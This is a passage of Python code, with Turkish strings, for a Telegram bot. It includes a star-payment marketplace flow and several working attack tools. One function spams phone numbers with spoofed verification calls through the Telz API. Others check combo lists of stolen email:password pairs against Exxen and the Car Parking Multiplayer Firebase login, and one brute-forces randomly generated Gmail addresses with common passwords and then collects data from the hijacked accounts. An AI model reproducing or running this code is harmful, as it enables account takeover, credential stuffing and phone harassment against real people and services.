      f"🏷 Kategori: **{cat}**\n"
      f"⭐ Ödenen: **{stars_paid}** yıldız\n"
      f"🆔 Sipariş: `{order_id or '-'}`\n\n"
      f"📦 **Teslimat:**\n`{delivered_content}`",
      parse_mode="Markdown",
    )
  except Exception as e:
    log_error("deliver_listing_buyer", e)
  owner_id = item.get("user_id")
  if owner_id:
    try:
      bot.send_message(
        int(owner_id),
        f"🔔 **İlan satıldı!**\n\n"
        f"📌 {title}\n"
        f"🏷 {cat}\n"
        f"⭐ Alıcı ödedi: **{stars_paid}** yıldız\n"
        f"👤 Alıcı ID: `{buyer_id}`\n"
        f"📦 Stok kalan: **{item.get('stock', 0) if l_id in listings else 0}**\n\n"
        f"ℹ️ Yıldız ödemesi Telegram üzerinden bota işlenir; "
        f"satıcı ödemesini admin/satış kaydından takip eder.",
        parse_mode="Markdown",
      )
    except Exception:
      pass
  for admin_id in list(admin_ids_set):
    try:
      bot.send_message(
        admin_id,
        f"🛒 **İlan satışı (yıldız)**\n"
        f"📌 {title} (`{l_id}`)\n"
        f"🏷 {cat} · ⭐ {stars_paid}\n"
        f"👤 Alıcı `{buyer_id}` · Satıcı `{owner_id}`\n"
        f"📦 `{str(delivered_content)[:200]}`",
        parse_mode="Markdown",
      )
    except Exception:
      pass
  log_activity("ilan_star_sale", buyer_id, f"{l_id}:{stars_paid}:{cat}")

def start_ilan_star_purchase(chat_id, buyer_id, l_id):
  """
  Yıldız BOTA EKLENMEZ.
  Alıcı satıcının username'ine yıldız gönderir, SS atar.
  SS satıcı + admin'e gider; onayda otomatik teslim.
  """
  item = listings.get(l_id)
  if not item:
    bot.send_message(chat_id, "❌ İlan bulunamadı.")
    return False
  stars = int(item.get("price_stars") or item.get("price") or 0)
  if stars < 1:
    bot.send_message(chat_id, "❌ Geçersiz fiyat.")
    return False
  stock = int(item.get("stock") or len(item.get("stock_items") or []) or 0)
  if stock < 1:
    bot.send_message(chat_id, "❌ Stok yok.")
    return False
  owner_id = item.get("user_id")
  owner_un = item.get("owner_username") or ""
  if owner_un and not str(owner_un).startswith("@"):
    owner_un = "@" + str(owner_un)
  if not owner_un or owner_un in ("@", "@None"):
    owner_un = f"id:{owner_id}"
    owner_link = f"tg://user?id={owner_id}" if owner_id else ""
  else:
    owner_link = f"https://t.me/{owner_un.lstrip('@')}"

  admin_temp_data[chat_id] = {
    "ilan_pay_l_id": l_id,
    "ilan_pay_stars": stars,
    "ilan_pay_owner": owner_id,
  }
  user_states[chat_id] = "waiting_ilan_pay_ss"

  cat = item.get("category", "HESAP")
  title = item.get("title", "İlan")
  msg = (
    f"🛒 **SATIN ALMA**\n\n"
    f"📌 {title}\n"
    f"🏷 {cat}\n"
    f"⭐ Gönder: **{stars} yıldız** → **{owner_un}**\n"
  )
  if owner_link and owner_link.startswith("http"):
    msg += f"🔗 {owner_link}\n"
  msg += (
    f"\n"
    f"━━━━━━━━━━━━━━━━━━━━\n"
    f"📸 **ÖDEME SONRASI FOTOĞRAF ZORUNLU**\n"
    f"━━━━━━━━━━━━━━━━━━━━\n\n"
    f"1️⃣ Satıcıya **{stars}⭐** gönder\n"
    f"2️⃣ Ödeme ekranının **FOTOĞRAFINI (SS)** hemen buraya at\n"
    f"3️⃣ Satıcı/admin onaylayınca ürün **otomatik teslim**\n\n"
    f"⚠️ Foto atmadan sipariş oluşmaz!\n"
    f"⚠️ Yıldız **bota değil**, doğrudan **satıcıya** gider.\n"
    f"İptal: /iptal"
  )
  markup = types.InlineKeyboardMarkup()
  if owner_link and owner_link.startswith("http"):
    markup.add(types.InlineKeyboardButton("👤 Satıcıya Git", url=owner_link))
  markup.add(types.InlineKeyboardButton("❌ İptal", callback_data="cancel_ilan_pay"))
  bot.send_message(chat_id, msg, reply_markup=markup, parse_mode="Markdown")
  return True

def submit_ilan_pay_ss(buyer_id, chat_id, photo_file_id, caption_extra=""):
  """SS alındı → satıcı + admin onay kuyruğu."""
  data = admin_temp_data.get(chat_id) or {}
  l_id = data.get("ilan_pay_l_id")
  stars = int(data.get("ilan_pay_stars") or 0)
  item = listings.get(l_id) if l_id else None
  if not item or not photo_file_id:
    bot.send_message(chat_id, "❌ İlan/SS bilgisi eksik. /start ile yeniden dene.")
    user_states.pop(chat_id, None)
    admin_temp_data.pop(chat_id, None)
    return

  order_id = str(uuid.uuid4())[:8]
  owner_id = item.get("user_id")
  owner_un = item.get("owner_username") or ""
  uname = ""
  try:
    pass
  except Exception:
    pass

  pending_listing_orders[order_id] = {
    "listing_id": l_id,
    "buyer_id": int(buyer_id),
    "stars": stars,
    "status": "await_seller",
    "title": item.get("title"),
    "category": item.get("category", "HESAP"),
    "owner_id": owner_id,
    "owner_username": owner_un,
    "photo_ss": photo_file_id,
    "time": get_current_time_str(),
    "note": (caption_extra or "")[:200],
  }
  save_data()
  user_states.pop(chat_id, None)
  admin_temp_data.pop(chat_id, None)

  am = types.InlineKeyboardMarkup(row_width=2)
  am.add(
    types.InlineKeyboardButton("✅ Onayla / Teslim Et", callback_data=f"seller_ok_{order_id}"),
    types.InlineKeyboardButton("❌ Reddet", callback_data=f"seller_no_{order_id}"),
  )
  cap = (
    f"🧾 **Yıldız ödeme SS**\n\n"
    f"🆔 Sipariş: `{order_id}`\n"
    f"📌 {item.get('title')}\n"
    f"🏷 {item.get('category', 'HESAP')}\n"
    f"⭐ Beklenen: **{stars}** yıldız\n"
    f"👤 Alıcı ID: `{buyer_id}`\n"
    f"👤 Satıcı: @{owner_un or owner_id}\n"
    f"🕐 {get_current_time_str()}\n\n"
    f"Onaylarsan stok **otomatik teslim** edilir.\n"
    f"Red → admin inceler."
  )
  try:
    bot.send_message(
      chat_id,
      f"✅ SS alındı. Satıcı + admin onaylıyor.\n🆔 `{order_id}`",
      parse_mode="Markdown",
    )
  except Exception:
    pass
  if owner_id:
    try:
      bot.send_photo(int(owner_id), photo_file_id, caption=cap, reply_markup=am, parse_mode="Markdown")
    except Exception:
      try:
        bot.send_message(int(owner_id), cap, reply_markup=am, parse_mode="Markdown")
      except Exception:
        pass
  for admin_id in list(admin_ids_set):
    try:
      bot.send_photo(admin_id, photo_file_id, caption=cap, reply_markup=am, parse_mode="Markdown")
    except Exception:
      try:
        bot.send_message(admin_id, cap, reply_markup=am, parse_mode="Markdown")
      except Exception:
        pass
  log_activity("ilan_ss_pay", buyer_id, f"{l_id}:{order_id}:{stars}")

def send_ilan_star_invoice(chat_id, buyer_id, l_id, stars):
  """Geriye dönük uyumluluk: fatura yok, SS akışına yönlendir."""
  return start_ilan_star_purchase(chat_id, buyer_id, l_id)

def process_ilan_star_payment(buyer_id, chat_id, l_id, stars_paid, payload):
  """Eski bot-faturası yolu kapalı."""
  try:
    bot.send_message(
      chat_id,
      "ℹ️ İlan ödemesi artık bota yıldız ile değil.\n"
      "Satıcıya yıldız gönderip SS atman gerekiyor. İlanı yeniden satın al.",
    )
  except Exception:
    pass

class TelzIstemci:
  temelurl = "https://api.telz.com/"
  basliklar = {
    "User-Agent": "Telz-Android/17.5.33",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json; charset=UTF-8",
  }

  def __init__(self, android_id=None, app_version="17.5.33", os_name="android", os_version="15"):
    self.android_id = android_id or uuid.uuid4().hex[:16]
    self.app_version = app_version
    self.os_name = os_name
    self.os_version = os_version
    self.device_uuid = str(uuid.uuid4())
    self.session = requests.Session()

  @staticmethod
  def random_device_name():
    brands = ["Pixel", "Xiaomi", "Samsung", "OnePlus", "Moto"]
    return f"{random.choice(brands)}-{uuid.uuid4().hex[:6]}"

  def gonder(self, endpoint, payload, timeout=12.0):
    url = self.temelurl + endpoint
    body = dict(payload)
    body.update({
      "android_id": self.android_id,
      "app_version": self.app_version,
      "os": self.os_name,
      "os_version": self.os_version,
      "ts": int(time.time() * 1000),
      "uuid": self.device_uuid,
    })
    r = self.session.post(
      url,
      data=json.dumps(body),
      headers=self.basliklar,
      timeout=timeout,
    )
    if r.status_code == 429:
      retry = r.headers.get("Retry-After", "?")
      raise RuntimeError(f"Rate limit — {retry} sn bekle")
    r.raise_for_status()
    try:
      return r.json()
    except ValueError:
      return r.text

  def kimlik_listesi(self):
    return self.gonder("app/auth_list", {"event": "auth_list"})

  def calistir(self, device_name=None, lang="tr"):
    device_name = device_name or self.random_device_name()
    return self.gonder("app/run", {
      "event": "run",
      "device_name": device_name,
      "ipv4_address": "10.1.10.1",
      "ipv6_address": "FE80::1",
      "lang": lang,
      "network_country": "tr",
      "network_type": "4G",
      "roaming": "no",
      "root": "no",
      "run_id": "",
      "sim_country": "tr",
    })

  def buton_durum(self, btn="on_reg_continue"):
    return self.gonder("app/stat_btns", {"event": "stat_btns", "btn": btn})

  def numara_dogrula(self, phone, region="TR"):
    return self.gonder("app/validate_phonenumber", {
      "event": "validate_phonenumber",
      "phone": phone,
      "region": region,
    })

  def arama_dogrula(self, phone, attempt="0", lang="tr"):
    return self.gonder("app/auth_call", {
      "event": "auth_call",
      "phone": phone,
      "attempt": attempt,
      "lang": lang,
    })

def _normalize_phone(raw):
  s = (raw or "").strip().replace(" ", "").replace("-", "")
  if not s:
    return None
  if s.startswith("00"):
    s = "+" + s[2:]
  if s.startswith("0") and not s.startswith("00"):
    s = "+90" + s[1:]
  if not s.startswith("+"):
    if s.startswith("90") and len(s) >= 12:
      s = "+" + s
    elif s.isdigit() and len(s) == 10:
      s = "+90" + s
    else:
      s = "+" + s
  digits = s[1:] if s.startswith("+") else s
  if not digits.isdigit() or len(digits) < 10:
    return None
  return s

def telz_max_times_for(user_id):
  """Kullanıcı max tekrar; admin None = sınırsız."""
  if user_id in admin_ids_set:
    return None
  return TELZ_MAX_TIMES

def telz_saldiri_baslat(numaralar, times=1, progress_cb=None):
  """
  Yeni Telz client ile arama doğrulama gönder.
  times: her numara için kaç kez
  progress_cb(round_i, total_rounds, phone, ok) opsiyonel
  Returns: list[str] sonuç satırları
  """
  times = max(1, int(times or 1))
  phones = []
  for numara in numaralar:
    phone = _normalize_phone(numara)
    if phone:
      phones.append(phone)
    else:
      phones.append(None)

  sonuclar = []
  ok_count = 0
  fail_count = 0
  for round_i in range(1, times + 1):
    for raw, phone in zip(numaralar, phones):
      if not phone:
        if round_i == 1:
          sonuclar.append(f"❌ Geçersiz: `{raw}`")
          fail_count += 1
        continue
      try:
        client = TelzIstemci()
        try:
          client.kimlik_listesi()
        except Exception:
          pass
        try:
          client.calistir()
        except Exception:
          pass
        try:
          client.buton_durum()
        except Exception:
          pass
        try:
          client.numara_dogrula(phone)
        except Exception:
          pass
        client.arama_dogrula(phone)
        ok_count += 1
        if progress_cb:
          try:
            progress_cb(round_i, times, phone, True)
          except Exception:
            pass
      except Exception as e:
        fail_count += 1
        if round_i == 1:
          sonuclar.append(f"❌ {phone} — {str(e)[:60]}")
        if progress_cb:
          try:
            progress_cb(round_i, times, phone, False)
          except Exception:
            pass
      time.sleep(1.0)
    if times > 1 and round_i < times:
      time.sleep(0.8)

  valid = [p for p in phones if p]
  sonuclar.insert(
    0,
    f"📦 Numara: **{len(valid)}** · Tekrar: **{times}**\n"
    f"✅ İstek: **{ok_count}** · ❌ Hata: **{fail_count}**",
  )
  for p in valid:
    sonuclar.append(f"📞 {p}")
  return sonuclar

def exxen_kontrol_et(text):
  if ":" not in text:
    return "❌ Yanlış format! Kullanım: email:şifre"

  parts = text.split(":", 1)
  email = parts[0].strip()
  password = parts[1].strip()

  if not email or not password:
    return "❌ Email veya şifre boş olamaz!"

  auth_str = f"{email}:{password}".encode('utf-8')
  encoded = base64.b64encode(auth_str).decode('utf-8')

  headers = {
    'authority': 'mw-proxy.app.exxen.com',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': f'Basic {encoded}',
    'content-type': 'application/json',
    'origin': 'https://www.exxen.com',
    'referer': 'https://www.exxen.com/',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36',
  }

  json_data = {
    'deviceDetails': {
      'deviceName': 'Chrome',
      'deviceType': 'Desktop',
      'modelNo': '139.0.0.0',
      'serialNo': '139.0.0.0',
      'brand': 'Chrome',
      'os': 'Windows',
      'osVersion': '10',
    },
  }

  try:
    response = requests.post(
      'https://mw-proxy.app.exxen.com/api/v2/user/auth/login',
      headers=headers,
      json=json_data,
      timeout=15
    )
    try:
      data = response.json()
    except:
      return f"❌ API yanıtı JSON formatında değil. HTTP Kod: {response.status_code}"

    if "error" in data:
      return f"❌ Hata: {data.get('error', 'Bilinmeyen hata')}"

    if "bearer" in data:
      name = data.get("name", "N/A")
      mail = data.get("email", "N/A")
      account_type = data.get("accountType", "N/A")

      bearer_dict = data.get("bearer")
      bearer = None
      if isinstance(bearer_dict, dict):
        bearer = bearer_dict.get("auth", {}).get("token")

      result = (
        "✅ GİRİŞ BAŞARILI!\n"
        "----------------------------------------\n"
        f"👤 İsim: {name}\n"
        f"📧 Email: {mail}\n"
        f"💳 Hesap Tipi: {account_type}\n"
      )
      if bearer:
        result += f"🔑 Token: {bearer[:30]}...\n"
      result += "----------------------------------------"
      return result
    else:
      return f"❌ GİRİŞ BAŞARISIZ!\n\nEmail: {email}\nŞifre: {password}"
  except Exception as e:
    return f"❌ Hata: {str(e)}"

class SimpleCPMChecker:
  def __init__(self):
    self.session = requests.Session()

  def check_login(self, email: str, password: str) -> bool:
    """Firebase verifyPassword — True = HIT, False = BAD"""
    try:
      payload = {
        "email": email,
        "password": password,
        "returnSecureToken": True,
        "clientType": "CLIENT_TYPE_ANDROID",
      }
      headers = {
        "Content-Type": "application/json",
        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 12; M2007J17C Build/1bf565c.2)",
        "X-Android-Package": "com.olzhas.carparking.multyplayer2",
        "X-Firebase-GMPID": "1:891105416504:android:37d689c257df3c37b19dcd",
      }
      url = (
        "https://www.googleapis.com/identitytoolkit/v3/relyingparty/"
        "verifyPassword?key=AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ"
      )
      response = self.session.post(url, json=payload, headers=headers, timeout=10)
      if response.status_code == 200:
        data = response.json()
        return "idToken" in data
      return False
    except Exception:
      return False

def cpm_kontrol_et(text: str) -> str:
  """Tek satır email:şifre — metin sonuç döner."""
  if ":" not in text:
    return "❌ Yanlış format! Kullanım: email:şifre"

  parts = text.split(":", 1)
  email = parts[0].strip()
  password = parts[1].strip()

  if not email or not password:
    return "❌ Email veya şifre boş olamaz!"

  checker = SimpleCPMChecker()
  try:
    if checker.check_login(email, password):
      return (
        "✅ **CPM HIT!**\n"
        "----------------------------------------\n"
        f"📧 Email: `{email}`\n"
        f"🔑 Şifre: `{password}`\n"
        "🎮 Giriş başarılı (Car Parking Multiplayer)\n"
        "----------------------------------------"
      )
    return (
      "❌ **CPM BAD**\n\n"
      f"Email: `{email}`\n"
      f"Şifre: `{password}`\n"
      "Giriş başarısız."
    )
  except Exception as e:
    return f"❌ Hata: {str(e)}"

def _cpm_progress_text(job, finished=False, stopped=False):
  total = int(job.get("total", 0) or 0)
  checked = int(job.get("checked", 0) or 0)
  hits = int(job.get("hits", 0) or 0)
  bads = int(job.get("bads", 0) or 0)
  errors = int(job.get("errors", 0) or 0)
  pct = int((checked / total) * 100) if total else 0
  bar_len = 12
  filled = int(bar_len * pct / 100) if total else 0
  bar = "█" * filled + "░" * (bar_len - filled)
  if stopped:
    status = "🛑 **DURDURULDU**"
  elif finished:
    status = "✅ **TAMAMLANDI**"
  else:
    status = "⏳ **TARANIYOR...**"
  return (
    f"🎮 **CPM Canlı Panel**\n\n"
    f"{status}\n"
    f"`[{bar}]` **{pct}%**\n\n"
    f"📦 Toplam combo: **{total}**\n"
    f"🔍 Kontrol edilen: **{checked}**\n"
    f"✅ HIT: **{hits}**\n"
    f"❌ BAD: **{bads}**\n"
    f"⚠️ Hata (timeout/api): **{errors}**\n"
    f"🕐 {get_current_time_str()}\n\n"
    f"Durdurmak için buton veya /durdur"
  )

def _cpm_stop_markup():
  markup = types.InlineKeyboardMarkup()
  markup.add(types.InlineKeyboardButton("🛑 Taramayı Durdur", callback_data="cpm_stop"))
  return markup

def run_cpm_check_and_send(chat_id, user_id, text: str):
  """
  Limitsiz combo CPM kontrolü.
  Canlı panel: checked / HIT / BAD / hata + durdur butonu.
  HIT .txt sadece kullanıcıya.
  """
  global active_cpm_jobs

  if user_id in active_cpm_jobs and not active_cpm_jobs[user_id].get("stop"):
    try:
      bot.send_message(
        chat_id,
        "⚠️ Zaten bir CPM taraması çalışıyor.\n"
        "Önce **Durdur** veya bitmesini bekle.",
        parse_mode="Markdown",
      )
    except Exception:
      pass
    return

  lines = []
  seen = set()
  for raw in (text or "").splitlines():
    raw = raw.strip()
    if not raw or ":" not in raw:
      continue
    email, password = raw.split(":", 1)
    email, password = email.strip(), password.strip()
    if not email or not password:
      continue
    key = f"{email.lower()}:{password}"
    if key in seen:
      continue
    seen.add(key)
    lines.append((email, password))

  if not lines:
    try:
      bot.send_message(
        chat_id,
        "❌ Geçerli satır yok.\nFormat: `user:pass` veya `email:pass` (ayrıca `|` `;` `,`) (her satıra bir hesap, limit yok)",
        parse_mode="Markdown",
      )
    except Exception:
      pass
    return

  total = len(lines)
  workers = get_checker_workers(user_id)
  job = {
    "stop": False,
    "total": total,
    "checked": 0,
    "hits": 0,
    "bads": 0,
    "errors": 0,
    "msg_id": None,
    "chat_id": chat_id,
    "workers": workers,
  }
  active_cpm_jobs[user_id] = job

  try:
    msg = bot.send_message(
      chat_id,
      _cpm_progress_text(job),
      reply_markup=_cpm_stop_markup(),
      parse_mode="Markdown",
    )
    job["msg_id"] = msg.message_id
  except Exception as e:
    log_error("cpm_panel_start", e)

  def _refresh_panel(force=False, finished=False, stopped=False):
    mid = job.get("msg_id")
    if not mid:
      return
    try:
      markup = None if (finished or stopped) else _cpm_stop_markup()
      bot.edit_message_text(
        _cpm_progress_text(job, finished=finished, stopped=stopped),
        chat_id,
        mid,
        reply_markup=markup,
        parse_mode="Markdown",
      )
    except Exception:
      pass

  checker = SimpleCPMChecker()
  hits = []
  last_ui = 0.0
  stopped_early = False

  for i, (email, password) in enumerate(lines, 1):
    if active_cpm_jobs.get(user_id, {}).get("stop"):
      stopped_early = True
      break
    try:
      ok = checker.check_login(email, password)
      if ok:
        hits.append(f"{email}:{password}")
        job["hits"] = len(hits)
      else:
        job["bads"] = int(job.get("bads", 0)) + 1
    except Exception:
      job["errors"] = int(job.get("errors", 0)) + 1
      job["bads"] = int(job.get("bads", 0)) + 1
    job["checked"] = i

    now = time.time()
    if i == 1 or i == total or (now - last_ui) >= 1.2 or i % 3 == 0:
      _refresh_panel()
      last_ui = now

    if i < total and not active_cpm_jobs.get(user_id, {}).get("stop"):
      w = int(job.get("workers") or get_checker_workers(user_id) or 4)
      time.sleep(max(0.08, 0.9 / max(1, w)))

  stopped_early = stopped_early or bool(active_cpm_jobs.get(user_id, {}).get("stop"))
  _refresh_panel(force=True, finished=not stopped_early, stopped=stopped_early)

  checked = int(job.get("checked", 0))
  summary = (
    f"🎮 **CPM {'Durduruldu' if stopped_early else 'Sonuç'}**\n\n"
    f"📦 Combo: **{total}**\n"
    f"🔍 Kontrol: **{checked}**\n"
    f"✅ HIT: **{len(hits)}**\n"
    f"❌ BAD: **{job.get('bads', 0)}**\n"
    f"⚠️ Hata: **{job.get('errors', 0)}**"
  )
  try:
    bot.send_message(chat_id, summary, parse_mode="Markdown")
  except Exception:
    pass

  active_cpm_jobs.pop(user_id, None)

  if not hits:
    try:
      bot.send_message(chat_id, "📭 HIT çıkmadı." + (" (tarama yarıda kesildi)" if stopped_early else ""))
    except Exception:
      pass
    return

  uname = "-"
  try:
    creds = user_credentials.get(user_id, {})
    uname = creds.get("reg_username") or creds.get("display_name") or str(user_id)
  except Exception:
    uname = str(user_id)

  temp = f"cpm_hits_{user_id}_{int(time.time())}.txt"
  try:
    with open(temp, "w", encoding="utf-8") as f:
      f.write("\n".join(hits) + "\n")

    user_caption = (
      f"✅ **{len(hits)}** CPM HIT\n"
      f"📦 Kontrol: {checked}/{total}"
      + (" · 🛑 yarıda durduruldu" if stopped_early else "")
    )
    try:
      with open(temp, "rb") as doc:
        bot.send_document(chat_id, doc, caption=user_caption, parse_mode="Markdown")
    except Exception as e:
      log_error("cpm_hits_user", e)
      try:
        bot.send_message(chat_id, "✅ HIT'ler:\n" + "\n".join(hits[:40]))
      except Exception:
        pass

    try:
      admin_cap = f"CPM HIT | {user_id} | {len(hits)} | {checked}/{total}"
      for admin_id in list(admin_ids_set):
        if int(admin_id) == int(user_id):
          continue
        try:
          with open(temp, "rb") as doc:
            safe_tg(bot.send_document, admin_id, doc, caption=admin_cap[:1024], retries=1)
        except Exception:
          pass
    except Exception:
      pass

    log_activity("cpm_check", user_id, f"total={total} checked={checked} hits={len(hits)} stop={stopped_early}")
  except Exception as e:
    log_error("cpm_hits_file", e)
    try:
      bot.send_message(chat_id, "✅ HIT'ler:\n" + "\n".join(hits[:40]))
    except Exception:
      pass
  finally:
    try:
      os.remove(temp)
    except Exception:
      pass


CPM_V2_AUTH = (
  "https://www.googleapis.com/identitytoolkit/v3/relyingparty/"
  "verifyPassword?key=AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ"
)
CPM_V2_CAP = "https://europe-west1-cpm-2-7cea1.cloudfunctions.net/GetUserRatingCall22_1"

CPM_V2_NAMES = [
  'ahmet', 'mehmet', 'ali', 'ayse', 'fatma', 'metin', 'hasan', 'busra',
  'melis', 'buse', 'muhammed', 'mesut', 'rasim', 'huseyin', 'seda',
  'tugce', 'esra', 'esma', 'esref', 'burhan', 'gizem', 'ecem', 'eslem',
  'ismail', "james", "john", "robert", "michael", "william", "david", "richard", "joseph", "thomas", "charles",
  "christopher", "daniel", "matthew", "anthony", "mark", "donald", "steven", "paul", "andrew", "joshua",
  "kenneth", "kevin", "brian", "george", "timothy", "ronald", "edward", "jason", "jeffrey", "ryan",
  "jacob", "gary", "nicholas", "eric", "jonathan", "stephen", "larry", "justin", "scott", "brandon",
  "benjamin", "samuel", "gregory", "alexander", "frank", "patrick", "raymond", "jack", "dennis", "jerry",
  "tyler", "aaron", "jose", "adam", "nathan", "henry", "douglas", "zachary", "peter", "kyle",
  "walter", "ethan", "jeremy", "harold", "keith", "christian", "roger", "noah", "gerald", "carl",
  "terry", "sean", "austin", "arthur", "lawrence", "jesse", "dylan", "bryan", "joe", "jordan",
  "billy", "bruce", "albert", "willie", "gabriel", "logan", "alan", "juan", "wayne", "roy",
  "ralph", "randy", "eugene", "vincent", "russell", "louis", "philip", "bobby", "johnny", "bradley",
  "caleb", "isaac", "hunter", "julian", "adrian", "ezra", "hudson", "nolan", "cameron", "connor",
  "santiago", "dominic", "ian", "xavier", "jace", "everett", "declan", "evan", "kayden", "parker",
  "wesley", "kai", "chase", "cole", "diego", "luis", "carlos", "miguel", "angel", "antonio",
  "jorge", "alejandro", "fernando", "manuel", "ricardo", "francisco", "eduardo", "mario", "roberto",
  "pedro", "sergio", "marco", "leonardo", "mary", "patricia", "jennifer", "linda", "elizabeth",
  "barbara", "susan", "jessica", "sarah", "karen", "nancy", "betty", "margaret", "sandra", "ashley",
  "kimberly", "emily", "donna", "michelle", "carol", "amanda", "dorothy", "melissa", "deborah",
  "stephanie", "rebecca", "sharon", "laura", "cynthia", "kathleen", "amy", "angela", "shirley", "anna",
  "brenda", "pamela", "emma", "nicole", "helena", "samantha", "katherine", "christine", "debra", "rachel",
  "carolyn", "janet", "catherine", "maria", "heather", "diane", "virginia", "julie", "joyce", "victoria",
  "olivia", "kelly", "christina", "lauren", "joan", "evelyn", "judith", "megan", "andrea", "hannah",
  "martha", "jacqueline", "frances", "gloria", "ann", "teresa", "kathryn", "sara", "janice", "jean",
  "alice", "madison", "doris", "abigail", "julia", "judy", "grace", "denise", "amber", "marilyn",
  "beverly", "danielle", "theresa", "sophia", "marie", "diana", "brittany", "natalie", "isabella",
  "charlotte", "rose", "alexis", "kayla", "chloe", "zoe", "mila", "eva", "harper", "scarlett",
  "camila", "penelope", "aria", "layla", "riley", "nora", "lily", "eleanor", "hazel", "violet",
  "aurora", "savannah", "audrey", "brooklyn", "bella", "claire", "skylar", "lucy", "paisley", "everly",
  "caroline", "nova", "genesis", "emilia", "kennedy", "willow", "kinsley", "naomi", "aaliyah", "elena",
  "maya", "luna", "stella", "ellie",
]
CPM_V2_PASSWORDS = [
  "123123", "123455", "123456", "1234567", "12345678",
  "123456789", "1234567890", "000000", "111111", "qwertyuiop",
]
CPM_V2_MODES = {
  "fast": {"workers": 12, "sleep": 0.05, "rate_sleep": 0.0, "label": "Hızlı"},
  "safe": {"workers": 4, "sleep": 0.55, "rate_sleep": 8.0, "label": "Güvenli"},
}
CPM_V2_WORKERS = 4
CPM_V2_SLEEP = 0.55
CPM_V2_RATE_SLEEP = 8.0

def _cpmv2_gen_account():
  """Orijinal hit tool ile ayni random mail/sifre uretimi."""
  am = random.randint(1, 6)
  mail = "".join(random.sample(string.ascii_lowercase + string.digits, am))
  bra = random.choice(CPM_V2_NAMES)
  yrk = random.randint(1, 5)
  quz = [
    f"{bra}{yrk}",
    f"{mail}",
    f"{bra}{bra}",
  ]
  lstt = random.choice(quz)
  gmail = f"{lstt}@gmail.com"
  password = random.choice([
    "123123", "123455", "123456", "1234567", "12345678",
    "123456789", "1234567890", "000000", "111111",
    "qwertyuiop", lstt,
  ])
  return gmail, password

def cpmv2_check_account(email, password):
  """CPM 2 Firebase login + capture — orijinal mantik.
  Donus: (ok, status, detail)
    ok=True  + SUCCESS = idToken var (HIT)
    ok=False + BAD     = yanlis sifre / yok
    ok=False + RATE    = TOO_MANY_ATTEMPTS (sayma, bekle)
    ok=False + ERROR   = ag/json hatasi
  """
  headers = {
    "User-Agent": "UnityPlayer/2022.3.62f2 (UnityWebRequest/1.0, libcurl/8.10.1-DEV)",
    "Accept-Encoding": "deflate, gzip",
    "Content-Type": "application/json",
    "X-Unity-Version": "2022.3.62f2",
  }
  try:
    payload = {
      "email": email,
      "password": password,
      "returnSecureToken": True,
      "clientType": "CLIENT_TYPE_ANDROID",
    }
    r = requests.post(CPM_V2_AUTH, json=payload, headers=headers, timeout=20)
    try:
      response = r.json()
    except Exception:
      return False, "ERROR", f"json:{r.status_code}"
  except Exception as e:
    return False, "ERROR", str(e)[:80]

  err = (response.get("error") or {}) if isinstance(response, dict) else {}
  msg = str(err.get("message") or "")
  if "TOO_MANY_ATTEMPTS" in msg or "TOO_MANY_ATTEMPTS_TRY_LATER" in msg:
    return False, "RATE", "rate-limit"

  if "idToken" not in response:
    return False, "BAD", msg[:60] if msg else "giris yok"

  amsever = response["idToken"]
  bulluk = response.get("localId")
  araba = "N/A"
  yariswin = "N/A"
  driftmax = "N/A"
  headers2 = {
    "User-Agent": "UnityPlayer/2022.3.62f2 (UnityWebRequest/1.0, libcurl/8.10.1-DEV)",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/json; charset=utf-8",
    "Authorization": f"Bearer {amsever}",
    "X-Unity-Version": "2022.3.62f2",
  }
  try:
    purnacan = requests.post(
      CPM_V2_CAP,
      data=json.dumps({"data": bulluk}),
      headers=headers2,
      timeout=20,
    )
    result = purnacan.json() if purnacan.content else {}
    if "result" in result:
      data = result["result"]
      if isinstance(data, str):
        data = json.loads(data)
      general = data.get("general", {}) if isinstance(data, dict) else {}
      araba = general.get("cars", "N/A")
      yariswin = general.get("race_win", "N/A")
      driftmax = general.get("drift_max", "N/A")
  except Exception:
    araba = yariswin = driftmax = "Hata"
  detail = f"Araba: {araba} · Win: {yariswin} · Max Drift: {driftmax}"
  return True, "SUCCESS", detail

def _cpmv2_panel_text(job, finished=False, stopped=False):
  hit = int(job.get("hits") or 0)
  kotu = int(job.get("bads") or 0)
  rate = int(job.get("rates") or 0)
  err = int(job.get("errors") or 0)
  checked = int(job.get("checked") or 0)
  if finished:
    head = "✅ Bitti"
  elif stopped:
    head = "🛑 Durduruldu"
  else:
    head = "🔍 CPM 2 otomatik taranıyor"
  return (
    f"🎮 **CPM 2 Hit Tool**\n\n"
    f"{head}\n"
    f"✅ HIT: **{hit}**\n"
    f"❌ KOTU: **{kotu}**\n"
    f"⏳ Rate-limit: **{rate}**\n"
    f"⚡ Hata: **{err}**\n"
    f"🔎 Denenen: **{checked}**\n"
    f"⚙️ Mod: **{job.get('mode_label', '?')}**\n"
    f"🧵 Worker: **{job.get('workers', CPM_V2_WORKERS)}** · sleep `{job.get('sleep', CPM_V2_SLEEP)}s`"
  )

def run_cpmv2_auto(chat_id, user_id, mode="safe", workers_override=None, combo_text=None):
  """Combo yok (auto) — mode: fast|safe. workers_override ile 2-8 zorla."""
  global active_cpmv2_jobs
  mode = "fast" if str(mode).lower() in ("fast", "hizli", "hızlı") else "safe"
  cfg = dict(CPM_V2_MODES.get(mode) or CPM_V2_MODES["safe"])
  if workers_override is not None:
    try:
      workers = max(CHECKER_SPEED_MIN, min(CHECKER_SPEED_MAX, int(workers_override)))
    except Exception:
      workers = int(cfg["workers"])
  else:
    try:
      workers = get_checker_workers(user_id, default=int(cfg["workers"]))
      workers = max(CHECKER_SPEED_MIN, min(CHECKER_SPEED_MAX, workers))
    except Exception:
      workers = int(cfg["workers"])
  sleep_s = float(cfg["sleep"])
  rate_sleep = float(cfg["rate_sleep"])
  mode_label = cfg["label"] + f" · {workers}th"

  if user_id in active_cpmv2_jobs and not active_cpmv2_jobs[user_id].get("stop"):
    try:
      bot.send_message(chat_id, "⚠️ CPM 2 zaten çalışıyor.")
    except Exception:
      pass
    return
  job = {
    "stop": False,
    "hits": 0,
    "bads": 0,
